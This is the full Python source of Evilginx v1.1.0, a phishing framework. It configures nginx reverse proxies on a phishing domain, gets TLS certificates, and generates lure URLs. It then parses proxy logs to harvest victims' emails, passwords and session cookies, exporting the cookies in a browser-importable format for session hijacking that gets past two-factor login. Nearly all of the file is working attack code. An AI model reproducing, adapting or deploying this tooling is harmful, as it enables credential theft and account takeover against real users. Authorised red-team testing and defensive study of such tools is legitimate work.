#!/usr/bin/python

#               _ _       _
#              (_) |     (_)
#     _____   ___| | __ _ _ _ __ __  __
#    / _ \ \ / / | |/ _` | | '_ \\ \/ /
#   |  __/\ V /| | | (_| | | | | |>  <
#    \___| \_/ |_|_|\__, |_|_| |_/_/\_\
#                    __/ |
#                   |___/
#
# author:  Kuba Gretzky
# website: breakdev.org
# github:  https://github.com/kgretzky/evilginx
# twitter  https://twitter.com/mrgretzky

"""Evilginx"""
import os
import os.path
import argparse
import json
import ConfigParser
import urllib
import time
import re
import datetime
import sys
import subprocess
import base64

VERSION = 'v.1.1.0'

EOL = '\n'
TAB = '\t'
DN = open(os.devnull, 'w')

email_by_ips = {}
passwd_by_ips = {}

GLOBAL_CFG = ConfigParser.ConfigParser()

SITE_DOMAINS = {}
SITE_CERTS = {}

CUR_DIR = os.path.dirname(os.path.abspath(__file__))
SSL_CERT_PATH = '/etc/letsencrypt/live/'
SITES_AVAILABLE_PATH = '/etc/nginx/sites-available/'
SITES_ENABLED_PATH = '/etc/nginx/sites-enabled/'
CONFIG_FILE_NAME = '.config'
VAR_LOGS = '/var/log/'
LOGS_DIR = CUR_DIR + '/logs'
CERTBOT_BIN = 'certbot-auto'

class log_data:
    def __init__(self, email, passwd, tokens):
        self.email = email
        self.passwd = passwd
        self.tokens = tokens

def load_cfg():
    global SITE_DOMAINS, SITE_CERTS
    cfg_file = os.path.join(CUR_DIR, CONFIG_FILE_NAME)
    if not os.path.exists(cfg_file):
        GLOBAL_CFG.add_section('config')
        GLOBAL_CFG.set('config', 'site_domains', '{}')
        GLOBAL_CFG.set('config', 'site_certs', '{}')
        save_cfg()
    else:
        GLOBAL_CFG.read(cfg_file)

    if GLOBAL_CFG.has_section('config') and GLOBAL_CFG.has_option('config', 'site_domains'):
        SITE_DOMAINS = json.loads(GLOBAL_CFG.get('config', 'site_domains'))
    if GLOBAL_CFG.has_section('config') and GLOBAL_CFG.has_option('config', 'site_certs'):
        SITE_CERTS = json.loads(GLOBAL_CFG.get('config', 'site_certs'))

def save_cfg():
    cfg_file = os.path.join(CUR_DIR, CONFIG_FILE_NAME)
    with open(cfg_file, 'w') as f:
        GLOBAL_CFG.set('config', 'site_domains', json.dumps(SITE_DOMAINS))
        GLOBAL_CFG.set('config', 'site_certs', json.dumps(SITE_CERTS))
        GLOBAL_CFG.write(f)

def add_to_file_if_not_exists(path, needle, add_line):
    with open(path, 'r+') as f:
        for line in f:
            if needle in line:
                break
        else:
            f.write(add_line + EOL)

def get_post_args(data):
    """returns post args as a dict"""
    ret = {}
    pargs = data.split('&')
    for parg in pargs:
        p = parg.split('=')
        if len(p) == 2:
            name = p[0]
            val = p[1]
            ret[name] = val
    return ret

def get_set_cookies(data):
    """returns set-cookies headers as a dict"""
    ret = {}
    cargs = data.split('||')
    for ck in cargs:
        ie = ck.find('=')
        sn = ck.find(';')
        if ie > -1 and sn > -1:
            name = ck[:ie]
            val = ck[ie+1:sn]
            ret[name] = unesc_data(val)
    return ret

def get_token_names(tokens_json):
    """gets token names from credentials config"""
    ret = []
    tokens = json.loads(tokens_json)
    for tk in tokens:
        for ck in tk["cookies"]:
            ret.append(ck)
    return ret

def get_token_domains(tokens_json):
    """gets tokens by domain"""
    ret = {}
    tokens = json.loads(tokens_json)
    for tk in tokens:
        for ck in tk["cookies"]:
            ret[ck] = tk["domain"]
    return ret

def tokens_ready(setcookies, tokens):
    """check if all required tokens are present in set-cookies headers"""
    if setcookies == None or tokens == None:
        return False
    _tokens = tokens[:]
    for tk in setcookies:
        if tk in _tokens:
            _tokens.remove(tk)
    if len(_tokens) == 0:
        return True
    return False

def dump_tokens(setcookies, tokens, token_domains):
    """dumps crednetial tokens to string compatible with EditThisCookie chrome extension"""
    ret = []
    for tk in tokens:
        name = tk
        val = setcookies[tk]
        domain = token_domains[tk]
        expire_time = int(time.time() + 2 * 365 * 24 * 60 * 60) # 2 years into the future
        ck = {}
        ck['domain'] = domain
        ck["expirationDate"] = expire_time
        ck['name'] = name
        ck['path'] = '/'
        ck['value'] = val
        ret.append(ck)
    return json.dumps(ret)

def create_log(outdir, logn, user_agent, email, passwd, tokens):
    """creates a log file"""
    if email == '':
        email = 'unknown'
    
    if not os.path.exists(outdir):
        os.makedirs(outdir)

    log_dir = os.path.join(outdir, email)
    t_str = datetime.datetime.utcfromtimestamp(time.time()).today().strftime('%Y%m%d_%H%M%S')
    
    if not os.path.exists(log_dir):
        os.mkdir(log_dir)

    # save creds
    if tokens != '':
        with open(os.path.join(log_dir, t_str + '_' + str(logn) + '_tokens.txt'), 'wt') as f:
            f.write('email:  ' + email + EOL)
            f.write('passwd: ' + passwd + EOL)
            f.write('user-agent: ' + user_agent + EOL + EOL)
            f.write(tokens + EOL)
    elif passwd != '':
        with open(os.path.join(log_dir, t_str + '_' + str(logn) + '_creds.txt'), 'wt') as f:
            f.write('email:  ' + email + EOL)
            f.write('passwd: ' + passwd + EOL)
            f.write('user-agent: ' + user_agent + EOL)

def load_creds_cfg(path):
    """loads credentials config file"""
    cfg = ConfigParser.ConfigParser()
    cfg.read(path)

    if cfg.has_section('creds') and ((cfg.has_option('creds', 'email_arg') and cfg.has_option('creds', 'passwd_arg')) or (cfg.has_option('creds', 'email_arg_re') and cfg.has_option('creds', 'passwd_arg_re')) or (cfg.has_option('creds', 'email_json_arg') and cfg.has_option('creds', 'passwd_json_arg')))  and cfg.has_option('creds', 'tokens'):
        return cfg
    return None

def fix_line(line):
    return line.replace('\\x','%')

def unesc_data(data):
    return data.replace('%22', '"')

def parse_line(cfg, cur_email, line):
    """parse log line"""
    global email_by_ips, passwd_by_ips

    remote_addr = cur_email = cur_passwd = token_data = user_agent = ''

    if line[:2] == '> ': # leftover data from previous parsing
        data = line.split()
        if len(data) >= 3:
            d_name = data[1]
            if d_name == "email_ip" and len(data) == 4:
                d_ip = data[2]
                d_email = data[3]
                cur_email = d_email
                email_by_ips[d_ip] = d_email
    else:
        line = fix_line(line)
        try:
            req = json.loads(line)

            email_arg = passwd_arg = email_arg_re = passwd_arg_re = email_arg_re_name = passwd_arg_re_name = email_json_arg = passwd_json_arg = ''

            if cfg.has_option('creds', 'email_arg'):
                email_arg = cfg.get('creds', 'email_arg').strip()
            if cfg.has_option('creds', 'passwd_arg'):
                passwd_arg = cfg.get('creds', 'passwd_arg').strip()
            if cfg.has_option('creds', 'email_arg_re'):
                email_arg_re = cfg.get('creds', 'email_arg_re').strip()
                si = email_arg_re.find(':=')
                if si > -1:
                    email_arg_re_name = email_arg_re[:si]
                    email_arg_re_pattern = email_arg_re[si+2:]
            if cfg.has_option('creds', 'passwd_arg_re'):
                passwd_arg_re = cfg.get('creds', 'passwd_arg_re').strip()
                si = passwd_arg_re.find(':=')
                if si > -1:
                    passwd_arg_re_name = passwd_arg_re[:si]
                    passwd_arg_re_pattern = passwd_arg_re[si+2:]
            if cfg.has_option('creds', 'email_json_arg'):
                email_json_arg = cfg.get('creds', 'email_json_arg').strip()
            if cfg.has_option('creds', 'passwd_json_arg'):
                passwd_json_arg = cfg.get('creds', 'passwd_json_arg').strip()

            remote_addr = req['remote_addr']
            user_agent = req['ua']
            post_args = get_post_args(req['body'])
            tokens = get_token_names(cfg.get('creds', 'tokens'))
            token_domains = get_token_domains(cfg.get('creds', 'tokens'))
            set_cookies = get_set_cookies(req['set-cookies'])
            try:
                post_json = json.loads(unesc_data(req['body']))
            except:
                post_json = None
            

            cur_email = ''
            cur_passwd = ''
            token_data = ''

            if email_arg != '' and email_arg in post_args:
                cur_email = urllib.unquote(post_args[email_arg]).decode('utf8')
                email_by_ips[req['remote_addr']] = cur_email
            if passwd_arg != '' and passwd_arg in post_args:
                cur_passwd = urllib.unquote(post_args[passwd_arg]).decode('utf8')
                passwd_by_ips[req['remote_addr']] = cur_passwd
            if email_arg_re_name != '' and email_arg_re_pattern != '' and email_arg_re_name in post_args:
                post_arg = urllib.unquote(post_args[email_arg_re_name]).decode('utf8')
                rxp = re.search(email_arg_re_pattern, post_arg)
                if rxp:
                    cur_email = rxp.group(1)
                    email_by_ips[req['remote_addr']] = cur_email
            if passwd_arg_re_name != '' and passwd_arg_re_pattern != '' and passwd_arg_re_name in post_args:
                post_arg = urllib.unquote(post_args[passwd_arg_re_name]).decode('utf8')
                rxp = re.search(passwd_arg_re_pattern, post_arg)
                if rxp:
                    cur_passwd = rxp.group(1)
                    passwd_by_ips[req['remote_addr']] = cur_passwd
            if email_json_arg != '' and post_json != None and email_json_arg in post_json:
                cur_email = urllib.unquote(post_json[email_json_arg]).decode('utf8')
                email_by_ips[req['remote_addr']] = cur_email
            if passwd_json_arg != '' and post_json != None and passwd_json_arg in post_json:
                cur_passwd = urllib.unquote(post_json[passwd_json_arg]).decode('utf8')
                passwd_by_ips[req['remote_addr']] = cur_passwd        

            if tokens_ready(set_cookies, tokens):
                token_data = dump_tokens(set_cookies, tokens, token_domains)
        except:
            print '[-] exception:', line
            pass

    return remote_addr, user_agent, cur_email, cur_passwd, token_data

def get_site_certs(site_name):
    """retrieves SSL/TLS certificate path for given site"""
    global SITE_CERTS
    if site_name in SITE_CERTS:
        return SITE_CERTS[site_name]['crt'], SITE_CERTS[site_name]['key']
    return '', ''

def config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path):
    """configures evilginx app"""
    global SITE_DOMAINS
    cfg_dir = os.path.dirname(cfg_path)

    site_confs = json.loads(cfg.get('site', 'site_conf'))

    if do_enable:
        phish_domain = domain
        base_phish_domain = domain.split('.')[-2] + '.' + domain.split('.')[-1]
        phish_hostnames = []
        phish_hostnames_esc = []
        if cfg.get('site', 'phish_subdomains') != '':
            phish_subdomains = json.loads(cfg.get('site', 'phish_subdomains'))
            for subd in phish_subdomains:
                phish_host = subd + '.' + domain
                phish_hostnames.append(phish_host)
                phish_hostname_esc = ''
                for c in phish_host:
                    if not c.isalpha() and not c.isdigit():
                        phish_hostname_esc += '%'
                    phish_hostname_esc += c
                phish_hostnames_esc.append(phish_hostname_esc)
        if len(phish_hostnames) == 0:
            phish_hostnames.append(domain)
            phish_hostname_esc = ''
            for c in domain:
                if not c.isalpha() and not c.isdigit():
                    phish_hostname_esc += '%'
                phish_hostname_esc += c
            phish_hostnames_esc.append(phish_hostname_esc)

        target_hosts = json.loads(cfg.get('site', 'target_hosts'))
        cookie_hosts = json.loads(cfg.get('site', 'cookie_hosts'))

        for site_conf in site_confs:
            conf_path = os.path.join(cfg_dir, site_conf)
            with open(conf_path, 'rb') as f:
                conf = f.read()

            crt_path_file = crt_path
            key_path_file = key_path
            if crt_path == '':
                crt_path_file = SSL_CERT_PATH + phish_domain + '/fullchain.pem'
            if key_path == '':
                key_path_file = SSL_CERT_PATH + phish_domain + '/privkey.pem'

            conf = conf.replace('{{LOG_DIR}}', VAR_LOGS)

            conf = conf.replace('{{CERT_PUBLIC_PATH}}', crt_path_file)
            conf = conf.replace('{{CERT_PRIVATE_PATH}}', key_path_file)

            conf = conf.replace('{{PHISH_DOMAIN}}', phish_domain)
            conf = conf.replace('{{BASE_PHISH_DOMAIN}}', base_phish_domain)
            conf = conf.replace('{{REDIR_ARG}}', cfg.get('site', 'redir_arg'))
            conf = conf.replace('{{SUCCESS_ARG}}', cfg.get('site', 'success_arg'))
            conf = conf.replace('{{LOG_NAME}}', cfg.get('site', 'log_name'))
            
            for idx, phish_hostname in enumerate(phish_hostnames):
                conf = conf.replace('{{PHISH_HOSTNAME[' + str(idx) + ']}}', phish_hostnames[idx])
                conf = conf.replace('{{PHISH_HOSTNAME_ESC[' + str(idx) + ']}}', phish_hostnames_esc[idx])
            for idx, target_host in enumerate(target_hosts):
                conf = conf.replace('{{TARGET_HOST[' + str(idx) + ']}}', target_host)
            for idx, cookie_host in enumerate(cookie_hosts):
                conf = conf.replace('{{COOKIE_HOST[' + str(idx) + ']}}', cookie_host)

            with open(os.path.join(SITES_AVAILABLE_PATH, site_conf), 'wb') as f:
                f.write(conf)

            if not os.path.exists(os.path.join(SITES_ENABLED_PATH, site_conf)):
                os.symlink(os.path.join(SITES_AVAILABLE_PATH, site_conf), os.path.join(SITES_ENABLED_PATH, site_conf))

            SITE_DOMAINS[cfg.get('site', 'name')] = domain
            SITE_CERTS[cfg.get('site', 'name')] = {'crt': crt_path, 'key': key_path}
            save_cfg()
    else:
        for site_conf in site_confs:
            if os.path.exists(os.path.join(SITES_ENABLED_PATH, site_conf)):
                os.remove(os.path.join(SITES_ENABLED_PATH, site_conf))
            if os.path.exists(os.path.join(SITES_AVAILABLE_PATH, site_conf)):
                os.remove(os.path.join(SITES_AVAILABLE_PATH, site_conf))

def list_sites():
    """gets apps config paths"""
    ret = {}
    for root, dirs, files in os.walk(os.path.join(CUR_DIR, 'sites')):
        for dir in dirs:
            cfg_path = os.path.join(root, dir, 'config')
            if os.path.exists(cfg_path):
                cfg = ConfigParser.ConfigParser()
                cfg.read(cfg_path)
                if cfg.has_section('site') and cfg.has_option('site', 'name'):
                    name = cfg.get('site', 'name')
                    ret[name] = cfg_path
    return ret

def get_site_config(site_name):
    """get app config"""
    for root, dirs, files in os.walk(os.path.join(CUR_DIR, 'sites')):
        for dir in dirs:
            cfg_path = os.path.join(root, dir, 'config')
            if os.path.exists(cfg_path):
                cfg = ConfigParser.ConfigParser()
                cfg.read(cfg_path)
                if cfg.has_section('site') and cfg.has_option('site', 'name'):
                    if site_name == cfg.get('site', 'name'):
                        return cfg, cfg_path
    return None, ''

def site_exists(site_name):
    """checks if app exists"""
    apps = list_sites()
    for name, path in apps.iteritems():
        if site_name == name:
            return True
    return False

def parse_args(show_help=False):
    """parse main args"""
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest='mode')
    g_setup = subparsers.add_parser('setup', help='Configure Evilginx.')
    g_setup.add_argument('-d', '--domain', help='Your phishing domain.', default='')
    g_setup.add_argument('--crt', help='Path to SSL/TLS public certificate file.', default='')
    g_setup.add_argument('--key', help='Path to SSL/TLS private key file.', default='')
    g_setup.add_argument('--use_letsencrypt', help='Restores custom SSL/TLS certificates to default LetsEncrypt.', action='store_true')
    g_setup.add_argument('-y', help='Answer all questions with \'Yes\'.', dest='auto_yes', action='store_true')
    mgrp = g_setup.add_mutually_exclusive_group(required=True)
    mgrp.add_argument('-l', '--list', help='List available supported apps.', action='store_true')
    mgrp.add_argument('--enable', help='Enable following site by name.', default='')
    mgrp.add_argument('--disable', help='Disable following site by name.', default='')
    g_parser = subparsers.add_parser('parse', help='Parse log file(s).')
    g_parser.add_argument('-s', '--site', help='Name of site to parse logs for (\'all\' to parse logs for all sites).', default='', required=True)
    g_parser.add_argument('--debug', help='Does not truncate log file after parsing.', action='store_true')
    g_url = subparsers.add_parser('genurl', help='Generate phishing URL.')
    g_url.add_argument('-s', '--site', help='Name of site to generate link for.', required=True)
    g_url.add_argument('-r', '--redirect', help='Redirect user to this URL after successful sign-in.', required=True)
    return parser.parse_args()

def banner():
    """shows banner"""
    print '            _ _       _            '
    print '           (_) |     (_)           '
    print '  _____   ___| | __ _ _ _ __ __  __'
    print ' / _ \\ \\ / / | |/ _` | | \'_ \\\\ \\/ /'
    print '|  __/\\ V /| | | (_| | | | | |>  < '
    print ' \\___| \\_/ |_|_|\\__, |_|_| |_/_/\\_\\'
    print '                 __/ |             '
    print ' by @mrgretzky  |___/       ' + VERSION
    print ''

def parser_main(args):
    """parser main function"""
    cfgs = []
    cfg_paths = []
    if args.site == 'all':
        all_sites = list_sites()
        for name, cfg_path in all_sites.iteritems():
            cfg, cfg_path = get_site_config(name)
            if cfg:
                cfgs.append(cfg)
                cfg_paths.append(cfg_path)
    elif site_exists(args.site):
        cfg, cfg_path = get_site_config(args.site)
        if cfg:
            cfgs.append(cfg)
            cfg_paths.append(cfg_path)
    else:
        print "[-] Site '" + args.site + "' not found."
        return

    last_passwd = ''

    for i in range(0,len(cfgs)):
        cfg = cfgs[i]
        cfg_path = cfg_paths[i]

        site_name = cfg.get('site', 'name')
        out_dir = os.path.join(LOGS_DIR, site_name)
        log_path = os.path.join(VAR_LOGS, cfg.get('site', 'log_name'))
        if i>0: print ''
        print "Parsing logs for site '" + site_name + "'..."

        creds_path = os.path.join(os.path.dirname(cfg_path), cfg.get('site', 'creds_conf'))
        if os.path.exists(creds_path):
            creds_cfg = load_creds_cfg(creds_path)
            if creds_cfg:
                cur_email = ''

                log_entries = {}
                clients = {}
                logn = 0
                ncreds = 0
                ntokens = 0
                if os.path.exists(log_path):
                    with open(log_path, 'r+b') as f:
                        lines = f.readlines()
                        for line in lines:
                            if len(line) > 0:
                                remote_addr, user_agent, email, passwd, tokens = parse_line(creds_cfg, cur_email, line)
                                if remote_addr != '':
                                    if remote_addr in email_by_ips:
                                        email = email_by_ips[remote_addr]
                                    if remote_addr in passwd_by_ips:
                                        passwd = passwd_by_ips[remote_addr]

                                    do_log = False
                                    if email != '' and passwd != '':
                                        if last_passwd != passwd:
                                            clients[remote_addr] = log_data(email, passwd, '')
                                            ncreds += 1
                                            last_passwd = passwd
                                            do_log = True
                                    if tokens != '':
                                        # we got the token so purge cache
                                        if remote_addr in email_by_ips: del email_by_ips[remote_addr]
                                        if remote_addr in passwd_by_ips: del passwd_by_ips[remote_addr]
                                        last_passwd = ''
                                        ntokens += 1
                                        do_log = True

                                    if do_log:
                                        create_log(out_dir, logn, user_agent, email, passwd, tokens)
                                        logn += 1
                        if not args.debug:
                            f.truncate(0)
                            f.seek(0)
                            for d_ip, d_email in email_by_ips.iteritems():
                                f.write('> email_ip ' + d_ip + ' ' + d_email + EOL)
                        else:
                            print '[*] Debug mode on. Log was not truncated!'
                else:
                    print "[-] Log file '" + log_path + "' not found."

                print '[+] Found creds:  ' + str(ncreds)
                print '[+] Found tokens: ' + str(ntokens)

            else:
                print '[-] Creds config corrupted.'
        else:
            print '[-] Creds file "' + creds_path + '" not found.'

def setup_main(args):
    """setup main function"""

    if args.disable or args.enable:
        if args.disable != '':
            domain = ''
            site_name = args.disable
            crt_path = ''
            key_path = ''
            do_enable = False
        elif args.enable != '':
            site_name = args.enable
            domain = ''
            if args.domain == '':
                if site_name in SITE_DOMAINS:
                    domain = SITE_DOMAINS[site_name]
            else:
                domain = args.domain.lower()

            if domain == '':
                print '[-] Domain argument needed.'
                print ''
                return

            crt_path, key_path = get_site_certs(site_name)
            if args.crt != '' and args.key != '':
                if os.path.exists(os.path.abspath(args.crt)) and os.path.exists(os.path.abspath(args.key)):
                    crt_path = os.path.abspath(args.crt)
                    key_path = os.path.abspath(args.key)
                else:
                    if not os.path.exists(args.crt):
                        print '[-] \'' + args.crt + '\' certificate file was not found.'
                    if not os.path.exists(args.key):
                        print '[-] \'' + args.key + '\' certificate file was not found.'
                    print ''
                    return
            elif (args.crt != '' and args.key == '') or (args.crt == '' and args.key != ''):
                print '[-] Both --crt and --key arguments must be specified.'
                print ''
                return
            
            if args.use_letsencrypt:
                crt_path = ''
                key_path = ''

            do_enable = True
            
        cfg, cfg_path = get_site_config(site_name)
        if cfg:
            print "[*] Using domain: " + domain
            if crt_path != '':
                print "[*] Using SSL/TLS public certificate file: " + crt_path
            if key_path != '':
                print "[*] Using SSL/TLS private key file: " + key_path
            print "[*] Stopping nginx daemon..."
            subprocess.call(['service', 'nginx', 'stop'], stdout=DN, stderr=DN)
            config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path)
            if do_enable:
                print "[+] Site '" + site_name + "' enabled."
                
                if not args.auto_yes: auto_parse = raw_input('[?] Do you want to automatically parse all logs every minute? [y/N] ')
                if args.auto_yes or auto_parse.upper() == 'Y':
                    print '[+] Logs will be parsed every minute via /etc/crontab.'
                    add_to_file_if_not_exists('/etc/crontab', os.path.join(CUR_DIR, __file__), '*/1 *   * * *   root    python ' + os.path.join(CUR_DIR, __file__) + ' parse -s all')

                if crt_path == '' and key_path == '':
                    if not args.auto_yes: get_ssl = raw_input("[?] Do you want to install LetsEncrypt SSL/TLS certificates now? [Y/n] ")
                    if args.auto_yes or get_ssl.upper() != 'N':
                        cmd = [os.path.join(CUR_DIR, CERTBOT_BIN), 'certonly', '--standalone', '--register-unsafely-without-email', '--agree-tos', '-d', domain]
                        cert_subdomains = json.loads(cfg.get('site', 'cert_subdomains'))
                        print "[*] Getting SSL/TLS certificates for following domains:"
                        print " - " + domain
                        for subd in cert_subdomains:
                            cmd.append('-d')
                            cmd.append(subd + '.' + domain)
                            print " - " + subd + "." + domain
                        if subprocess.call(cmd) == 0:
                            print '[+] Certificates obtained successfully.'
                        else:
                            print '[-] Failed to obtain certificates.'
                    if not args.auto_yes: renew_ssl = raw_input('[?] Do you want to auto-renew all obtained SSL/TLS certificates? [Y/n] ')
                    if args.auto_yes or renew_ssl.upper() != 'N':
                        print '[+] Setting all SSL/TLS certificates to be auto-renewed via /etc/crontab.'
                        add_to_file_if_not_exists('/etc/crontab', os.path.join(CUR_DIR, CERTBOT_BIN), '0  3    * * *   root    ' + os.path.join(CUR_DIR, CERTBOT_BIN) + ' renew') # run renew at 3:00am every day
            else:
                print "[+] Site '" + site_name + "' disabled."

            print "[*] Starting nginx daemon..."
            subprocess.call(['service', 'nginx', 'start'], stdout=DN, stderr=DN)
        else:
            print "[-] Site '" + site_name + "' not found."
    elif args.list:
        print 'Listing available supported sites:'
        print ''
        apps = list_sites()
        for name, path in apps.iteritems():
            cfg = ConfigParser.ConfigParser()
            cfg.read(path)
            subdomains = []
            if cfg.get('site', 'cert_subdomains') != '':
                subdomains = json.loads(cfg.get('site', 'cert_subdomains'))
            print ' - ' + name + ' (' + path + ')'
            if len(subdomains) > 0:
                sd_line = '   subdomains: '
                for idx, subd in enumerate(subdomains):
                    if idx > 0:
                        sd_line += ', '
                    sd_line += subd
                print sd_line

def genurl_main(args):
    """generate phishing url"""
    site_name = args.site
    cfg, cfg_path = get_site_config(site_name)
    if cfg:
        if site_name in SITE_DOMAINS:
            domain = SITE_DOMAINS[site_name]
            if cfg.get('site', 'phish_subdomains') != '':
                phish_subdomains = json.loads(cfg.get('site', 'phish_subdomains'))
                phish_hostname = phish_subdomains[0] + '.' + domain
            else:
                phish_hostname = domain

            url = 'https://' + phish_hostname
            print 'Generated following phishing URLs:'
            print ''
            for phish_path in json.loads(cfg.get('site', 'phish_paths')):
                if phish_path[0] != '/': phish_path = '/' + phish_path
                gen_url = url + phish_path
                if args.redirect != '':
                    b64redir = base64.urlsafe_b64encode(args.redirect).replace('=','')
                    gen_url += '?' + cfg.get('site','redir_arg') + '=0' + b64redir
                print ' : ' + gen_url

        else:
            print "[-] Site '" + site_name + "' is not enabled."
    else:
        print "[-] Site '" + site_name + "' not found."

def main():
    """main function"""

    banner()
    load_cfg()
    args = parse_args()

    if args.mode == 'parse':
        parser_main(args)
    elif args.mode == 'setup':
        setup_main(args)
    elif args.mode == 'genurl':
        genurl_main(args)
    print ''

if __name__ == '__main__':
    main()
